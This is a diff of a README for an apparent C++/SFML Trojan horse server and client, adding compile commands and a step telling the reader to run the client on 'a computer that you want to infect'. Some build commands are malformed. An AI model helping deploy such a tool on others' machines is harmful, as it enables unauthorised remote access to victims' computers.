@@ -3,10 +3,12 @@ This is a trajos horse I developed in C++ using SFML. I will add a video transfe
 I strongly advise you to not use it for nonequal purposes
 
 If you compile with g++ use the command :
+To run the server :
 $  g++ server.cpp -c 
 $  g++ server.o -o -lsfml-network
 $  ./server
-in a other widow of your terminal
+
+run now the client in a computer that you want to infect : 
 $  g++ client.cpp -c 
 $  g++ client.o -o -lsfml-network
 $  ./client
